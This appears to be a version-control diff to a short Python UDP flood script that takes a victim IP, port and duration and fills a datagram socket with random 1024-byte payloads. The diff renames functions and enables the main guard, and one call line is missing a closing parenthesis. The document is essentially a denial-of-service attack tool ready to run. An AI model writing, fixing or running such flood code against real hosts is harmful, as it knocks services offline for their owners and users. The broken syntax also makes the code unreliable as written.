@@ -3,7 +3,7 @@ import time, socket, sys, random
 def help():
 	print("Command: " + sys.argv[0] + " IP PORT TIME")
 
-def dosss(victim, vport, duration):
+def doss(victim, vport, duration):
 	server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	bytes = random._urandom(1024)
 	timeout = (time.time() + duration)
@@ -25,14 +25,14 @@ def dosss(victim, vport, duration):
 		sys.exit()
 
 
-def start():
+def main():
 	if len(sys.argv) != 4:
 		help()
 	
 	else:
-		dosss(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
+		doss(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
 
-#if __name__ == '__main__':
+if __name__ == '__main__':
 
-start()
+	main()
 
